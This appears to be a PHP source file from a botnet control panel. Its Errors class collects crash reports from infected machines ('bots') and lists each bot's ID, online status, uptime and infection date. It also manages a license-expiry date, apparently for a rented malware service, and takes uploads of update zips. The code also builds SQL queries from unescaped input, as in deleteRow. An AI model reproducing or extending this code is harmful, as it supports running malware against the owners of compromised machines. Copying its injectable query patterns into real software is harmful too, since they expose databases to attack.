<?php

require("../config.php");
require("../pdo.php");
require("../helpers.php");

class Errors
{
	private $db;
	private $EXPIRE_FILE = "../static/expires.txt";
	private $IGNORE_ERRORS_FILE = "../static/ignore_errors.txt";
	private $lastError = "";
	private $knownErrors = [];
	private $tpl = "";
	private $skippedKnownErrors = 0;
	
	public $withKnownErrors = false;
	
	public function __construct()
	{
		$this->db = new Db();
		$this->db->connect();
		if(!$this->db->is_connected)
		{
			$this->lastError = "can not connect to db";
		}

		$this->loadKnownErrors();
		$this->tpl = file_get_contents('tpls/errors.html');
	}
	
	public function loadKnownErrors()
	{
		if(file_exists($this->IGNORE_ERRORS_FILE))
		{
			$this->knownErrors = array_map('trim', file($this->IGNORE_ERRORS_FILE));
		}
	}
	
	public function getError()
	{
		return $this->lastError;
	}
	
	public function showPasswordForm()
	{
		return "<form method=post><p style='text-align: right'><input name=pass style='border: 0'></p>";
	}
	
	public function show($content)
	{
		echo str_replace("%CONTENT%", $content, $this->tpl);
	}
	
	public function displayMsg($text)
	{
		$r = $this->db->escape($text);
		$msg = substr($r, 1, strlen($r)-2);
		
		$sql = "SELECT id, bot_id, FROM_UNIXTIME(UNIX_TIMESTAMP(time)) as time_formatted, msg from errors WHERE msg like('%{$msg}%') order by id desc";
		$data = $this->db->fetch($sql, true);

		$msg_u = urlencode($text);
		$html = "
		<p><a href='?a=deleteText&text={$msg_u}' onclick='return confirm(\"Sure?\")' style='color: darkred'><button class='btn btn-danger'>Delete all</button></a></p>
		
		<table class='table table-bordered'>
		<tr>
			<th style='width: 50px'>Bot ID / time</th>
			<th>Data</th>
		</tr>";

		foreach($data as $row)
		{
			$r = $this->db->fetch("select id from bots where bot_id='{$row['bot_id']} AND last_seen > NOW() - INTERVAL 12 HOUR'; ", true);
			if(isset($r[0]['id']))
				$alive = "<b style='color: green'>Online</b>";
			else
				$alive = "<b style='color: darkred'>Offline</b>";

			$r = $this->db->fetch("select uptime from bots where bot_id='{$row['bot_id']}'; ", true);
			if(sizeof($r))
				$uptime = time_readable($r[0]['uptime']);
			else
				$uptime = 0; // bot is deleted

			$r = $this->db->fetch("select registered from bots where bot_id='{$row['bot_id']}'; ", true);
			if(sizeof($r))
				$registered = $r[0]['registered'];
			else
				$registered = 0; // bot is deleted
				
			$msg = $row['msg'];
			$msg = "<textarea class='traceback'>" .htmlspecialchars($msg). "</textarea>";
			
			$html .= "<tr>
				<td style='text-align: left'>
					#{$row['bot_id']}<br />
					Error time: {$row['time_formatted']}<br />
					Up: {$uptime}<br />
					Infected at: {$registered}<br />
					<a target='_blank' href='index.php?a=admin&action=bots&bbot_id={$row['bot_id']}&page=bot_page'><button class='btn btn-primary'>Bot page</button></a> {$alive}
				</td>
				<td>{$msg}</td>
			</tr>";
		}

		$html .= "</table>";
		return $html;
	}
	
	public function deleteText($text)
	{
		$r = $this->db->escape($text);
		$r = substr($r, 1, strlen($r)-2);
		
		$sql = "SELECT count(id) as sz from errors where msg like ('%$r%')";
		
		$data = $this->db->fetch($sql, true);
		$sz = $data[0]['sz'];
		
		if($sz > 0)
		{
			$sql = "delete from errors where msg like ('%$r%')";
			$this->db->fetch($sql);
			return $this->msg("{$sz} rows were deleted.");
		}else{
			return $this->msg("No rows found.");
		}
	}
	
	public function deleteRow($id)
	{
		$sql = "delete from errors where id={$id};";
		$this->db->fetch($sql);
		return $this->msg("Report was deleted.");
	}
	
	public function deleteAll()
	{
		$sql = "delete from errors;";
		$this->db->fetch($sql);
		return $this->msg("Reports were deleted.");
	}
	
	public function deleteKnown()
	{
		$sql = "select id, msg from errors;";
		$res = $this->db->fetch($sql, true);
		
		if(!sizeof($res)) return $this->msg("No reports.");
		
		$ids2delete = [];
		foreach($res as $row)
		{
			if($this->isKnownError($row['msg']))
				$ids2delete[] = $row['id'];
		}
		
		$sz = sizeof($ids2delete);
		$ids_str = implode(",", $ids2delete);
		$sql = "delete from errors where id in({$ids_str});";
		$this->db->fetch($sql);
		
		return $this->msg("<b>{$sz}</b> reports were deleted.");
	}
	
	public function msg($text)
	{
		return "<p style='text-align: center; color: #000F65; font-weight: bold'>{$text}</p>";
	}
	
	public function dumpAll()
	{
		$sql = "SELECT id, bot_id, FROM_UNIXTIME(UNIX_TIMESTAMP(time)) as time_formatted, msg from errors order by id desc";
		$data = $this->db->fetch($sql, true);

		$text = "";
		foreach($data as $row)
		{
			$text .= "\n\n------------------------ ";
			$text .= "ERROR #" . $row['id'] . " (" . $row['bot_id'] . ") @ " . $row['time_formatted'] . " --------------------------------\n\n" . $row['msg'];
		}
		
		$name = "errors.txt";
		header("Content-Disposition: attachment; filename={$name}\n");
		header("Content-Type: text/plain; charset=utf-8;  name={$name}");
		
		header("Accept-Ranges: bytes\n");
		header("Expires: Mon, 1 Jan 2020 00:00:00 GMT\n");
		header("Cache-control: private\n");
		header("Pragma: private\n");
		
		$sz = strlen($text);
		header("Content-Length: {$sz}\n\n");
		
		die($text);
	}
	
	public function showKnownErrors()
	{
		$html = "";
		
		if(isset($_POST['new_errors_text']))
		{
			$txt = trim($_POST['new_errors_text']);
			if(!is_writable($this->IGNORE_ERRORS_FILE))
			{
				return $this->msg("File is not writable.");
			}
			
			file_put_contents($this->IGNORE_ERRORS_FILE, $txt);
			$html .= $this->msg("File was updated.");
		}
		
		$this->loadKnownErrors();
		
		$ignore = implode("\n", $this->knownErrors);
		
		$html .= "<form method='post' action='?a=knownErrors'>
		<p><textarea name='new_errors_text' class='form-control' style='width: 100%; height: 400px; font-size: 11pt' wrap='off'>{$ignore}</textarea></p>
		<p><input type='submit' value='Save' class='btn btn-primary' /></p>
		</form>
		";
		
		return $html;
	}
	
	private function isKnownError($msg)
	{
		foreach($this->knownErrors as $knownError)
		{
			if(trim($knownError) == "") continue;
			
			// comment
			if(substr($knownError, 0, 1) == '#') continue;
			
			// complex marker
			if(strstr($knownError, "||"))
			{
				$ps = explode("||", $knownError);
				
				$complexFound = true;
				foreach($ps as $p)
				{
					if(!strstr($msg, $p)) $complexFound = false;
				}

				if($complexFound) return true;
			}
			
			if(strstr($msg, $knownError))
			{
				return true;
			}
		}
		
		return false;
	}
	
	function getExpireDate()
	{
		if(!file_exists($this->EXPIRE_FILE)) return "Not set";
		
		$ts = (int)file_get_contents($this->EXPIRE_FILE);
		
		$diff = $ts - time();
		$days = round($diff/60/60/24);
		
		$word = "day";
		if($days > 1)
			$word .= "s";
		
		$dt = date("M d H:i", $ts);
		return $dt;
	}
	
	public function update($data)
	{
		$content = "";
		
		if($data['error'] == 1) return "<b style='color: red'>Uploading error</b>";
		
		$cmd = "unzip {$data['tmp_name']} -d ..";
		$content .= "Current dir: " . getcwd() . "<br />";
		$pathTo = getcwd() . "/..";
		
		$zip = new ZipArchive;
		if ($zip->open($data['tmp_name']) === true) {
			
			//$zip->extractTo($pathTo);
			$zip->close();
			$content .= "Unpacked successfully<br />";
		}else{
			$content .= "<b style='color: red'>Uploading error</b><br />";
		}

		return $content;
	}
	
	public function main()
	{
		$content = "";
		
		
		//~ if(isset($_POST['saveConfig']) && trim($_POST['config']) != "")
			//~ file_put_contents("../config.php", trim($_POST['config']));

		//$config = file_get_contents("../config.php");

		if(isset($_FILES['zip']))
			return $this->update($_FILES['zip']);

		if(isset($_POST['update_ts']))
		{
			$ts = (int) $_POST['update_ts'];
			file_put_contents($this->EXPIRE_FILE, $ts);
			die("OK|{$ts}");
		}
		
		if(isset($_POST['days']))
		{
			$days = (int) $_POST['days'];
			$addMonth = (isset($_POST['addMonth']))? true : false;
			$sign = (isset($_POST['removeMode']))? "-" : "+";
			$reset = (isset($_POST['resetMode']))? true : false;

			$ts = (int)file_get_contents($this->EXPIRE_FILE);

			if($reset) // reset mode
			{
				$new_ts = time();
			
			}else if($addMonth){ // add/remove 1 month
				
				$dt = new DateTime();
				$dt->setTimestamp($ts);
				$dt->modify("{$sign}1 month");
				$new_ts = $dt->getTimestamp();
				
			}else if($days != ""){  // add/remove N days
			
				$dt = new DateTime();
				$dt->setTimestamp($ts);
				$dt->modify("{$sign}{$days} days");
				$new_ts = $dt->getTimestamp();
			}else{
				$new_ts = false;
			}
			
			if($new_ts != false)
				file_put_contents($this->EXPIRE_FILE, $new_ts);
		}
		
		$dt = $this->getExpireDate();
		$content .= <<<PHP
<p>License is active until: <code>{$dt}</code></p>
		<form method='post'>
			<div class="row">
				
				<div class="col-md-2">
					Add N days<br />
					<input type="text" class="form-control" name="days" value="" />
				</div>
				<div class="col-md-2">
<input type="checkbox" id="addLabel" class="form-check-input" checked name="addMonth" /> <label for="addLabel">1 month</label>
<br />
<input type="checkbox" id="rmLabel" class="form-check-input" name="removeMode" /> <label for="rmLabel">Remove</label>
<br />
<input type="checkbox" id="resLabel" class="form-check-input" name="resetMode" /> <label for="resLabel">Reset to 0</label>
				</div>
				<div class="col-md-2">
					<br />
					<input type="submit" class="btn btn-primary" value="Send" />
				</div>
</form>

<form method="post" enctype="multipart/form-data" action="cmd.php">
				
				<div class="col-md-3">
				<label class="form-label" for="f">Upload update zip</label> <br />
				<input type="file" class="form1-control" name="zip" id="f" />
				</div>
				
				<div class="col-md-1">
				<br />
					<input type="submit" class="btn btn-primary" value="Send" />
				</div>
</div>
</form>

PHP;

//~ <hr />
//~ <div class='row'>
	//~ <div class='col-md-6'>
	
	//~ <form method="post">
		//~ <input type="hidden" name="saveConfig" value="1" />
		//~ <textarea name="config" rows="10" class="form-control">{$config}</textarea>
		//~ <br />
		//~ <input type="submit" class="btn btn-primary" value="Save" />
	//~ </form>
	
	//~ </div>
	//~ <div class='col-md-6'>

		//~ <ul>
			//~ <li>Zip root must be the same with config.php dir</li>
			//~ <li>www-data permission to write</li>
		//~ </ul>
	//~ </div>
//~ </div>

		return $content;
	}
	
	public function getTypes()
	{
		$sql = "SELECT bot_id, msg from errors";
		$rows = $this->db->fetch($sql, true);
		if(!sizeof($rows)) return $this->msg("No rows.");
		
		$types = [];
		$msg_bots = [];
		foreach($rows as $row)
		{
			if(!$this->withKnownErrors)
			{
				if($this->isKnownError($row['msg'])) {
					$this->skippedKnownErrors++;
					continue;
				}
			}
			
			preg_match("/Place: (.*)/", $row['msg'], $match);
			$type = $match[1];
			
			if(!array_key_exists($type, $types))
				$types[$type] = [];

			preg_match("/Msg: (.*)/", $row['msg'], $match);
			$msg = $match[1];
			
			if(array_key_exists($msg, $types[$type]))
				$types[$type][$msg]++;
			else
				$types[$type][$msg] = 1;
				
			if(!array_key_exists($msg, $msg_bots))
				$msg_bots[$msg] = [];
			
			$msg_bots[$msg][] = $row['bot_id'];

		}
		
		$html = "<h3 class='text-center'>Error reports</h3>";
		$sz = sizeof($this->knownErrors);
		$html .= "<p>Known errors signs: <b>{$sz}</b>; Skipped errors: <b>{$this->skippedKnownErrors}</b>; 
		<a href='?a=showErrors&withKnownErrors=1'>show all</a></p>";
		
		foreach($types as $type=>$msgs)
		{
			$html .= "<p>{$type}</p><ul>";
			foreach($msgs as $msg=>$amount)
			{
				$bots = array_unique($msg_bots[$msg]);
				$num = sizeof($bots);
				$bot_ids = implode("','", $bots);

				$sql = "select registered from bots where bot_id in('{$bot_ids}') order by registered ASC";
				$res = $this->db->fetch($sql, true);
				if(sizeof($res))
					$from = $res[0]['registered'];
				else
					$from = "0";

				$sql = "select registered from bots where bot_id in('{$bot_ids}') order by registered DESC";
				$res = $this->db->fetch($sql, true);
				if(sizeof($res))
					$to = $res[0]['registered'];
				else
					$to = "0";
				
				$msg_u = urlencode($msg);
				
				$html .= "<li><b>{$amount} errors on {$num} bots</b>: <small>{$msg}</small>
				<br />
				Bot regged between: <b>{$from} - {$to}</b>
				<br />
				<a href='?a=displayMsg&text={$msg_u}'>Show</a> &bull; 
				<a href='?a=deleteText&text={$msg_u}' onclick='return confirm(\"Sure?\")' style='color: darkred'>Delete</a>
				</li>";
			}
			$html .= "</ul>";
		}
		
		return $html;
	}
	
}
